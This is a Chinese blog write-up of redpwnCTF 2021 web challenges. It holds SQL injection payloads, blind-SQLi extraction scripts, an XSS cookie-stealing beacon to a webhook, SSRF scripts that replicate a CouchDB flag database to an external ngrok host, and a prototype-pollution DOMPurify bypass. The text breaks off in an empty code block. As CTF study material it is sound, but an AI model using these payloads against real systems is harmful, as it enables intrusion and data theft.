---
title: "RedpwnCTF2021 Wp"
slug: "redpwn2021-wp"
description: "算是第一个自己报名的ctf叭？还挺好玩的，打星号的是没复现的，之后我必回来鞭尸"
date: 2021-08-08T20:08:39+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

官方的docker地址~~复现一本满足~https://github.com/redpwn/redpwnctf-2021-challenges

## web/inspect-me

> See if you can find the flag in the source code!
>
> [inspect-me.mc.ax](https://inspect-me.mc.ax/)

![image-20210710092212510](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092212510.png)

![image-20210710092254315](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092254315.png)

## web/orm-bad

> I just learned about orms today! They seem kinda difficult to implement though... Guess I'll stick to good old raw sql statements!
>
> [orm-bad.mc.ax](https://orm-bad.mc.ax/)
>
> Downloads - [app.js](https://static.redpwn.net/uploads/eb4c66c15fe3013340068ef0a34bd5dd5c0c98c567fac53b158d56afe07b511c/app.js)

万能密码：admin'or'1 : admin

![image-20210710092643161](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092643161.png)

关于orm 之后要补一下知识：[Object–relational mapping](https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping)    [ORM 实例教程](http://www.ruanyifeng.com/blog/2019/02/orm-tutorial.html)


## web/secure

> Just learned about encryption—now, my website is unhackable!
>
> [secure.mc.ax](https://secure.mc.ax/)
>
> Downloads - [index.js](https://static.redpwn.net/uploads/210a9fe526e420576e4b6c1cb74eeed437c1a89955c8158c14aa365c45578200/index.js)

还是个登录框，尝试万能密码

![image-20210710094442324](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094442324.png)

源码是这样的

```js
const crypto = require('crypto');
const express = require('express');

const db = require('better-sqlite3')('db.sqlite3');
db.exec(`DROP TABLE IF EXISTS users;`);
db.exec(`CREATE TABLE users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
);`);
db.exec(`INSERT INTO users (username, password) VALUES (
    '${btoa('admin')}',
    '${btoa(crypto.randomUUID)}'
)`);

const app = express();

app.use(
  require('body-parser').urlencoded({
    extended: false,
  })
);

app.post('/login', (req, res) => {
  if (!req.body.username || !req.body.password)
    return res.redirect('/?message=Username and password required!');

  const query = `SELECT id FROM users WHERE
          username = '${req.body.username}' AND
          password = '${req.body.password}';`;
  try {
    const id = db.prepare(query).get()?.id;

    if (id) return res.redirect(`/?message=${process.env.FLAG}`);
    else throw new Error('Incorrect login');
  } catch {
    return res.redirect(
      `/?message=Incorrect username or password. Query: ${query}`
    );
  }
});
```

他这个b64加密是发生在前端的，也就是在发包的时候就已经对post的数据进行了预处理，而具体到后端进行sql语句的查询时会直接拼接req.body.username/passwd的数据，不会进行进一步的检查或过滤

![image-20210710104923251](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104923251.png)

![image-20210710104859539](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104859539.png)

刚开始想复杂了

## web/cool

> Aaron has a message for the cool kids. For support, DM BrownieInMotion.
>
> [cool.mc.ax](https://cool.mc.ax/)
>
> Downloads - [app.py](https://static.redpwn.net/uploads/e03916d52bb7e84cbd2f9f26e5de162fdd0442c40d8397a103aab5813031fd83/app.py)

登录框，可以注册 先尝试test: test 登录成功但是无法获取信息（注册后也会跳转这个页面

![image-20210710105453861](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105453861.png)

留意cookie部分，是熟悉的flask session，扔进工具里解密

![image-20210710105534823](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105534823.png)

再参考源码中的/message部分，考虑将session设为{"username":"ginkoid"}后登入查看信息（开始以为是session伪造 后来发现不是）

![image-20210710113131546](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710113131546.png)

看一下其他部分的源码，首先是init()

```python
def init():
    # this is terrible but who cares
    execute('''
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password TEXT
        );
    ''')
    execute('DROP TABLE users;')
    execute('''
        CREATE TABLE users (
            username TEXT PRIMARY KEY,
            password TEXT
        );
    ''')

    # put ginkoid into db
    ginkoid_password = generate_token()
    execute(
        'INSERT OR IGNORE INTO users (username, password)'
        f'VALUES (\'ginkoid\', \'{ginkoid_password}\');'
    )
    execute(
        f'UPDATE users SET password=\'{ginkoid_password}\''
        f'WHERE username=\'ginkoid\';'
    )
```

然后是在创建用户`create_user()`和登录`check_login()`时都会检测用户名中是否有非法字符（白名单是26个英文字母大小写和数字），算是挺严格的

```python
def create_user(username, password):
    if any(c not in allowed_characters for c in username):
        return (False, 'Alphanumeric usernames only, please.')
    if len(username) < 1:
        return (False, 'Username is too short.')
    if len(password) > 50:
        return (False, 'Password is too long.')
    other_users = execute(
        f'SELECT * FROM users WHERE username=\'{username}\';'
    )
    if len(other_users) > 0:
        return (False, 'Username taken.')
    execute(
        'INSERT INTO users (username, password)'
        f'VALUES (\'{username}\', \'{password}\');' # passwd部分可控
    )
    return (True, '')
```

考虑了一下二次注入，因为注册时的passwd部分完全可控，设想是这样的

![image-20210710122622508](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710122622508.png)

构造passwd部分为 `'),('ginkoid','passwd`

emmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时`correct_password[0][0]==password`，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是`[0][0]`，而新插入的passwd将是`[1][0]`；并且在`init()`时定义username是primary 也不可能有重复的

————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现

在看了[这篇wp](https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md)之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是

```
'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
```

其中的`ON CONFLICT DO UPDATE SET`，在[这篇官方文档](https://www.sqlite.org/lang_UPSERT.html)里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won't do.

最后使用盲注的方式，先上一下脚本 （[这里是来源](https://github.com/SuperStormer/writeups/blob/master/redpwnctf_2021/web/cool.py)）再说说思路

```python
import time
import requests
url = "https://cool.mc.ax/"
# url = "http://127.0.0.1:5000/"

prefix = "asdfjwfoijweoijfojiewfj"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
val = ""
for i in range(32):
    username = prefix + str(time.time_ns()).replace("0", "")	# 注意白名单里没有0 要换掉
    password = f"'||(select substr(password,{i+1},1) from users)||'"
    resp = requests.post(url + "register", data={"username": username, "password": password}).text
    for c in charset:
        resp = requests.post(url, data={"username": username, "password": c}).text
        if "Incorrect" not in resp:
            print(c)
            val += c
            break
print(val)
```

注入点仍然是上文提到的`/register`路由中`create_user(username,password)`（当时找对了注入点，但是盲注这块还是做的少）

![image-20210806085327316](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806085327316.png)

主要的payload是

```python
password = f"'||(select substr(password,{i+1},1) from users)||'"
```

这一句，当进入到注册流程时 会执行

```python
excute('INSERT INTO users (username, password)' f'VALUES (\'{username}\', \'{password}\');')
```

即

```python
excute('INSERT INTO users(username, password)' values ('xxxxusernamexxxx', ''||(select substr(password,n,1) from users)||''))
```

其中`||`连接两个不同的字符串，得到一个新的字符串；所以发送注册请求时password的值就是后面的查询语句`select substr(password,n,1) from users`，而查询语句返回的是`substr(password,n,1)` 是ginkoid这个账户的密码的其中一位，要获得这个值具体是什么 需要再有一个`for in _ in charset`遍历，在登录处 把这个值给试出来

[英文版讲解](https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md)：*The SELECT statement will take the character at index in ginkoid's password, and concatenate it with '', to be used as the new user's password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.*

获得密码后以ginkoid的账号登录，会得到一个mp3文件，但是并不是什么所谓的隐写 flag就在抓包后可以看到

![image-20210713164749339](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164749339.png)

————其实还是有一点点疑问，为什么`select substr(password,n,1) from users`就能确保是ginoid的passwd呢？ginkoid是表中的第一条数据，在新建表后立刻插入，这就可以保证在查询的时候只查ginkoid的密码吗？

discord之前有人问过这个问题，当时的解答是这是sqllite的特性，但是用sqllite在线工具尝试后发现也不是这样的 也会返回所有数据的`substr(x,x,x)`的值，但是确实是用这样的payload能做出来

![image-20210713164423092](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164423092.png)

————后来想了一下 是这里的`return correct_password[0][0]==password` 确保了虽然sql查询语句返回的是很多个单一字母，但是是多行返回，仍然只会取到第一个；再加上username是主键 第一个插入，所以这个payload是可以的![image-20210716173434141](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716173434141.png)

以一个事后诸葛亮的角度来看`return correct_password[0][0]==password` 这句代码 其实有暗示的成分在了

————还有另一版的脚本 discord里收的![image-20210716175415526.png](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716175415526.png)

```python
import asyncio
import random

import aiohttp

allowed = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
url = '<https://cool.mc.ax/>'

n = 32
final = dict()

async def try_pass(sem, username, password, index):
    params = {
        'username': username,
        'password': password,
    }
    async with sem:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=params) as resp:
                result = await resp.text()
                if 'Incorrect' not in result:
                    print(f'password[{index}]: {password}')
                    final[index] = password

async def get_char(sem, index):
    # random username since otherwise we error
    username = ''.join(random.choices(allowed, k=32))
    payload = f"'||(SELECT substr(password,{index+1},1) FROM users)||'"
    assert(len(payload) <= 50)

    params = {
        'username': username,
        'password': payload,
    }

    async with sem:
        async with aiohttp.ClientSession() as session:
            await session.post(url + 'register', data=params)

    tasks = []
    for c in allowed:
        tasks.append(try_pass(sem, username, c, index))

    await asyncio.gather(*tasks)

async def main():
    # without this we get an OSError due to too many open file descriptors
    sem = asyncio.Semaphore(300)

    index_tasks = []
    for i in range(n):
        index_tasks.append(get_char(sem, i))

    await asyncio.gather(*index_tasks)

    password = ''
    for i in range(len(final)):
        password += final[i]

    print(f"Password: {password}")

asyncio.run(main())
```

## web/notes

> Texting things to yourself, but online! [notes.mc.ax](https://notes.mc.ax/)
>
> *Please put a reasonably secure password when making an account*
>
> Report problems [here](https://admin-bot.mc.ax/notes).
>
> Downloads - [notes.tar.gz](https://static.redpwn.net/uploads/b84015269379e24fc336a02b23656a1428e8bea965667738ede86e3c8e611ca1/notes.tar.gz)

先看页面 是个登录框，先填用户名和密码再点login或register，尝试test: test登入，界面是一个可以加notes 自定body和tag的app![image-20210710144224462](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710144224462.png)

在view notes看到已经有人试过xss了，这里有个小小的越权漏洞，/view/+username直接可以看到其他的师傅在尝试什么样的payload（看了wp以后才意识到这里的tag部分就是注入点 而当时的我以为是卡bug了![image-20210710195356571](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710195356571.png)

简单审了下源码，也没啥特别的，首先初始化一个admin号，flag在admin的private分类的notes中；对于个人发的notes会转义body部分为html实体来预防xss

但是这个notes-app的形式是妥妥的xss了，那突破口在哪里捏？其实是被忽略的tag部分！一般情况下看到tag可选private/public就会不关注这里，但是配合特殊的DOM解析 这里无疑是注入点！下面简单分析一下，[参考wp](https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#notes)

从/static/view.html中我们可以看到这个notes-app的前端渲染所凭借的模板长啥样

![image-20210806093357548](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093357548.png)

body部分被完全的保护了，但是tag没有过滤 只是限制了个数

![image-20210806093711969](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093711969.png)

我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用`<p>` 另一个里面放`</p>`，中间的部分会被放在一起）这里选用的是`<style>`这个tag，利用它onload的属性

还有一个待解决的问题是上下两个notes之间会有`<div class="card">`的存在；这也是不用`<iframe>`和它的onload属性的原因，因为浏览器是不允许`<iframe>`中属性换行的

我们最终的payload

```
body: anything
tag: <style a='
body: anything
tag: 'onload='`
body: `;eval(somecode)/*
tag: */'>
```

然后是常规的xss

```html
<!DOCTYPE html>
<html>
    <body>
        <script>
            window.open("https://notes.mc.ax/view/<username>", "navigator.sendBeacon('<webhook server>', document.cookie)");
        </script>
    </body>
</html>
```

## web/Requester

> Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021
>
> [requester.mc.ax](https://requester.mc.ax/)
>
> Downloads - [requester-release.zip](https://static.redpwn.net/uploads/d92499fb296055bd3767e8d5c707605ca56a00517726fa281fa35dfda611fdee/requester-release.zip)

java可以说是完全不懂，比赛的时候就简单看了下就溜了，参考 [解法1 - _replicator](https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/)  [解法2 - _find](https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester)

![image-20210806100214553](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806100214553.png)

一个简单的java-app，检测给出的api是否正常 并且返回一个json

给了docker

![image-20210710160029981](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710160029981.png)

先用jd-gui打开jar包看看源码

![image-20210716211333162](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716211333162.png)

先看Main.class

```java
public class Main {
    public static Database db;

    public static String flag;

    public static void main(String[] args) {
        String adminUser = System.getenv("adminUser");
        String adminPassword = System.getenv("adminPassword");
        flag = System.getenv("flag");
        String javalinEnv = System.getenv("javalinEnv");
        db = new Database(adminUser, adminPassword);
        db.initializeDatabase();
        JavalinJte.configure(createTemplateEngine(javalinEnv));
        Javalin app = Javalin.create().start(8080);
        app.get("/", ctx -> ctx.render("index.jte"));
        app.get("/createUser", Handlers::createUser);
        app.get("/testAPI", Handlers::testAPI);
    }
}
```

做一些初始化的工作，取出admin的用户名和密码以及flag的值，新建一个database，分出3个路由；

先看database.class（分析的比较详细 之前做java很少

```java
private final String adminUsername;
private final String adminPassword;

public Database(String adminUsername, String adminPassword) {
    this.adminUsername = adminUsername;
    this.adminPassword = adminPassword;
}

private String getDbString() {
    return "http://" + this.adminUsername + ":" + this.adminPassword + "@couchdb:5984/";
}

private boolean validateAlphanumeric(String name) {
    return name.matches("^[a-zA-Z0-9_]*$");
}
```

存储从main.class里接收到的adminUsername&adminPassword；`getDbString()`返回一个可以用来连接couchdb数据库的url

```java
public void createDatabase(String name) throws Exception {
    if (name.length() > 16 || !validateAlphanumeric(name))
      throw new Exception("Illegal name");
    JSONObject res = HttpClient.putAPI(getDbString() + getDbString(), "");
    if (!res.has("ok") || !res.getBoolean("ok"))
      throw new Exception("Database creation failed");
  }

  public void initializeDatabase() {
    try {
      createDatabase("_replicator");
    } catch (Exception e) {
      Utils.logException(e);
      System.out.println("Replicator already initialized");
    }
    try {
      createDatabase("_users");
    } catch (Exception e) {
      Utils.logException(e);
      System.out.println("Users already initialized");
    }
    try {
      createDatabase("log");
    } catch (Exception e) {
      Utils.logException(e);
      System.out.println("Log already initialized");
    }
}
```

通过向构造好的url发送http请求来创建数据库，有三个默认的库：_replicator, _users, log

```java
public void createUser(String name, String password) throws Exception {
    if (name.length() > 16 || !validateAlphanumeric(name))
      throw new Exception("Illegal name");
    if (password.length() > 16 || !validateAlphanumeric(password))
      throw new Exception("Illegal password");
    // ... boring java stuff
    JSONObject res = HttpClient.putAPI(getDbString() + "_users/org.couchdb.user:" + getDbString(), userObj.toString());
    // ... boring java stuff
  }

public void addUserToDatabase(String dbName, String username) throws Exception {
    if (dbName.length() > 16 || !validateAlphanumeric(dbName))
      throw new Exception("Illegal dbname");
    if (username.length() > 16 || !validateAlphanumeric(username))
      throw new Exception("Illegal username");
   // ... boring java stuff
    JSONObject res = HttpClient.putAPI(getDbString() + getDbString() + "/_security", configObj.toString());
    // ... boring java stuff
  }

  public void insertDocumentToDatabase(String dbName, String document) throws Exception {
    // ... boring java stuff
    JSONObject res = HttpClient.postAPI(getDbString() + getDbString(), document);
    // ... boring java stuff
  }
```

这部分是创建用户并插入数据库中 并且插入一个文件，欸 用的也是http发请求这一招 这不就可控了？

这里就完了，转去看Handlers.class

```java
public static void createUser(Context ctx) {
	String username = (String)ctx.queryParam("username", String.class).get();
    String password = (String)ctx.queryParam("password", String.class).get();
    try {
        Main.db.createDatabase(username);
        Main.db.createUser(username, password);
        Main.db.addUserToDatabase(username, username);
        JSONObject flagDoc = new JSONObject();
        flagDoc.put("flag", Main.flag);
        Main.db.insertDocumentToDatabase(username, flagDoc.toString());
        ctx.result("success");
    } catch (Exception e) {
		throw new InternalServerErrorResponse("Something went wrong");
    }
}
```

当发出一个请求 带着username和passwd时，它会调用`createUser()`创建一条用户的数据存入库中，并且存一个flagDoc；接着看最后一个testAPI

```java
public static void testAPI(Context ctx) {
	String url = (String)ctx.queryParam("url", String.class).get();
    String method = (String)ctx.queryParam("method", String.class).get();
    String data = ctx.queryParam("data");
    try {
		URL urlURI = new URL(url);
		if (urlURI.getHost().contains("couchdb"))
			throw new ForbiddenResponse("Illegal!");
	} catch (MalformedURLException e) {
		throw new BadRequestResponse("Input URL is malformed");
	}
	try {
		if (method.equals("GET")) {
			JSONObject jsonObj = HttpClient.getAPI(url);
			String str = jsonObj.toString();
		} else if (method.equals("POST")) {
			JSONObject jsonObj = HttpClient.postAPI(url, data);
			String stringJsonObj = jsonObj.toString();
			if (Utils.containsFlag(stringJsonObj))
				throw new ForbiddenResponse("Illegal!");
		} else {
			throw new BadRequestResponse("Request method is not accepted");
		}
	} catch (Exception e) {
			throw new InternalServerErrorResponse("Something went wrong");
	}
	ctx.result("success");
}
```

对给出的url（通过url参数进行提交）进行get或者post，先检查`if (urlURI.getHost().contains("couchdb"))`，如果为真直接报错；之后发出请求 如果`Utils.containsFlag(stringJsonObj)`为真也会报错出去

源码算是看完了，接下来想想解题的方法（有部分关于ssrf的前置知识可以看这篇鼻祖ppt - [A New Era of SSRF - Exploiting URL Parser in  Trending Programming Languages! - 🍊Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)）

本地先起一个环境，run on localhost:8080，

```bash
$ curl localhost:8080/testAPI?url=https://couchdb:5984/\&method=GET
Illegal!
```

由之前的代码分析我们知道因为couchdb的存在所以illegal，但是不太重要（反正终会被绕过）先创建一个用户

```bash
$ curl http://localhost:8080/createUser?username=neptunian\&password=neptunian
# Creating user
success

$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq
# Listing "neptunian" database documents, using our credentials (jq formats our JSON output)
{
  "total_rows": 1,
  "offset": 0,
  "rows": [
    {
      "id": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "key": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "value": {
        "rev": "1-cee1919fc2eda9a6068ed2792608a9dd"
      }
    }
  ]
}

$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b | jq
# Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b
{
  "_id": "99ea668366ac9d5d74fd2bc91c00ed5b",
  "_rev": "1-cee1919fc2eda9a6068ed2792608a9dd",
  "flag": "flag{fake}"
}
```

显然当我们新建一个用户时，我们的fake flag会被自动插入这个数据库中，并且直接curl是可以取出来的，但是题目是不能直接curl 需要缝合到限定的testAPI上，尝试构造一下~

```bash
$ curl -vv http://localhost:8080/testAPI?method=GET\&url=http://neptunian:neptunian\@couchdb\:5984\@couchdb\:5984/neptunian
...
success
```

这样构造的url并不会触发filter，但是由于仅仅返回success而没有更多的信息，为了验证是不是触及到了couchdb server，我们可以尝试插入一个自定义的doc，这里用py脚本传

```python
import requests
import json

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}

# Simple POST Test
params = (
    ('url', 'http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian'),
    ('method', 'POST'),
    ('data',
        json.dumps({
            "some_int": 1,
            "some_string": "c"
        })
    )
)

# Local
response = requests.get('http://localhost:8080/testAPI', headers=headers, params=params)

print(response.text)
```

```bash
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq
{
  "total_rows": 2,
  "offset": 0,
  "rows": [
    {
      "id": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "key": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "value": {
        "rev": "1-cee1919fc2eda9a6068ed2792608a9dd"
      }
    },
    {
      "id": "99ea668366ac9d5d74fd2bc91c00fd09",
      "key": "99ea668366ac9d5d74fd2bc91c00fd09",
      "value": {
        "rev": "1-f8744c7d9e172ac4b188fbb8f337a204"
      }
    }
  ]
}
# There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09!

$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 | jq
{
  "_id": "99ea668366ac9d5d74fd2bc91c00fd09",
  "_rev": "1-f8744c7d9e172ac4b188fbb8f337a204",
  "some_int": 1,
  "some_string": "c"
}
```

足以证明我们自己构造的带testAPI的缝合怪是可以正常执行couchdb相关的增删查改功能的

而重要的是远程也能打通，这里有这么个好东西https://docs.couchdb.org/en/3.1.1/replication/replicator.html，我们只需要构造一组post数据就可以远程得到一份数据！

```json
{
    "source": "source_db_name",
    "target": "http://dest_user:dest_password@destination_host/dest_database"
}
```

至于做法就很简单了：先用ngrok搞一个网上可访问的couchdb，得到临时的url https://2d0a4710580a.ngrok.io，先创建数据库来便于接收之后复制的数据

```bash
$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag
{"ok":true}
```

然后就可以利用replicator和精心构造的json数据大搞特搞了！先本地

```python
import requests
import json

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}

# POST Replication
params = (
    ('url', 'http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate'),
    ('method', 'POST'),
    ('data',
        json.dumps({
            "source": "neptunian",
            "target": "https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag"
        })
    )
)

# response = requests.get('http://localhost:8080/testAPI', headers=headers, params=params)
response = requests.get('https://requester.mc.ax/testAPI', headers=headers, params=params)

print(response.text)
```

```bash
$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs | jq
{
  "total_rows": 1,
  "offset": 0,
  "rows": [
    {
      "id": "d139bf6ab1733d779f64e9c6c4026de9",
      "key": "d139bf6ab1733d779f64e9c6c4026de9",
      "value": {
        "rev": "1-4bb8f6dafef84b2d856fe1444f38b0a2"
      }
    }
  ]
}

$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 | jq
{
  "_id": "d139bf6ab1733d779f64e9c6c4026de9",
  "_rev": "1-4bb8f6dafef84b2d856fe1444f38b0a2",
  "flag": "flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}"
}
```

好耶！复制怪好耶！

虽然上面说了这么多，其实核心思路也挺清晰的，就是先认真分析源码 找出漏洞点是用couchdb创建用户时会自动插入flag 这个过程是使用http请求 我们很容易就可以构造一个url创建用户 让flag进入自己掌控的数据库中，之后就可以顺畅的进行数据库的增删查改；但是这还需要接上题目中给出的testAPI入口才行，又经过一些构造可以成功缝合；但是由于鸡贼的设置 testAPI处的请求只会返回成功或失败，为了确切的得到flag，我们利用了couchdb的_replicator这个好东西来进行一个数据的复制，得到flag~~~

————以下是第二种解法: char-by-char-blind-sqli

源码的分析不变，这是根本，差异之处首先在于构造url时这里利用了couchdb的另一个好东西_find

```bash
curl -X POST -H "Content-Type: application/json" 'http://strellicsquad:12345@couchdb:5984/strellicsquad/_find' --data '{"selector":{"flag": {"$regex": ".*"}}}'
```

本地测试可以成功会显出flag；第二个差异在缝合testAPI的时候，由于filter对于大小写不太敏感，所以大写Couch来绕过了；同样面临回显只有成功或失败 但是char-by-char-blind-sqli无所畏惧~

```python
import urllib.parse
import requests
import json
import string

# first, make a request to
# /createUser?username=strellicsquad&password=12345

alphabet = "etoanihsrdlucgwyfmpbkvjxqz{}_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ"

def test_regex(regex):
    url = "http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find"
    data = json.dumps({"selector":{"flag": {"$regex": regex}}})
    r = requests.get(f"https://requester.mc.ax/testAPI/?url={urllib.parse.quote(url)}&method=POST&data={urllib.parse.quote(data)}")
    return "Something went wrong" in r.text

flag = "flag{"
while not flag.endswith("}"):
    for c in alphabet:
        check = "^" + flag + c + ".*"

        if test_regex(check):
            print(f"found {c} -> {flag}{c}")
            flag += c
            break
```

也可以拿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}

————最悲催的莫过于之后我也用docker在本地起了一个环境 但是初始化有问题，导致localhost:5984无法访问

![image-20210720093017634](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210720093017634.png)

我搜了一下 有相关问题的解答 但都不明确……

从这个报错看 应该是说题目相关的需要的database_does_not_exist，但是用于初始化的/_utils也无法访问，直接`curl 127.0.0.1:5984`也是失败，`curl couchdb:5984`也是失败，处理报错真是心累

## web/requester-strikes-back

> Java was found to not be the future. Can you take down requester again?

源码处有一处修改`if (urlURI.getHost().toLowerCase().contains("couchdb"))`

这使得我们不能用之前的Couchdb大写的方式来绕过，但是

![image-20210806155508706](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155508706.png)

![image-20210806155558838](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155558838.png)

结合[Incorrect handling of malformed authority component by URIUtils#extractHost](https://mail-archives.apache.org/mod_mbox/hc-commits/202009.mbox/%3C20200930085030.C135C82908@gitbox.apache.org%3E)

我们只需要把之前的url改成`http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find`即可（解法二）

解法一直接跑就行 一样能通

相关的一些ssrf前置知识&url解析问题仍然可以看这里：[A New Era of SSRF - Exploiting URL Parser in  Trending Programming Languages! - 🍊Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)（好厉害的ppt）

参考：[wp1](https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/#requester-strikes-back)  [wp2](https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester-strikes-back)

## web/pastebin-1

> Ah, the classic pastebin.
>
> [pastebin-1.mc.ax](https://pastebin-1.mc.ax/)
>
> [Admin bot](https://admin-bot.mc.ax/pastebin-1)
>
> Downloads - [main.rs](https://static.redpwn.net/uploads/4313574d2348012d122d849530c4f18340644d88ea04f0cbb4932bd35efde1da/main.rs)

pastebin，类似留言板的样子 可以发表paste

第一反应就是xss，试一下alert(1) 成功弹窗![image-20210710093018218](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093018218.png)

题目另外提供了一个/admin-bot页面，![image-20210710093113748](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093113748.png)

这个，妥妥的xss好吧 直接xss platform一把梭！

![image-20210710094254880](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094254880.png)

## ***web/pastebin-2-social-edition

> Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.
>
> [pastebin-2-social-edition.mc.ax](https://pastebin-2-social-edition.mc.ax/)
>
> [Admin bot](https://admin-bot.mc.ax/pastebin-2-social-edition)

这次adminbot会给自己的paste下面留言回复

![8Vc6Cyf.png](https://i.imgur.com/8Vc6Cyf.png)

显然啊 还是xss，但是用了DOMPurify，并且这个版本也很新 之前的一些bug也没法利用，[参考wp](https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#pastebin-2-social-edition)

看源码

![image-20210806171955901](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806171955901.png)

注意到这里，如果有错误 就会设置`errorContainer.innerHTML = message;`，如果我们能控制error message 就能做到xss了；这里利用原型污染prototype pollution，即使DOMPurify可以阻挡一些xss常用的标签或者属性，也阻止不了原型污染

```html
<form>
<fieldset name="__proto__">
            <input name="error" value="1" />
            <input name="message" value="<img src=x onerror='alert(1)'>" />
</fieldset>
<input value="Post Comment" type="submit" />
</form>
```

我们可以把error污染成任意值，message污染为xss内容和payload

```html
<form>
<fieldset name="__proto__">
            <input name="error" value="1" />
            <input name="message" value="<img src=x onerror='alert(1)'>" />
</fieldset>
<input value="Post Comment" type="submit" />
</form>
```

```js
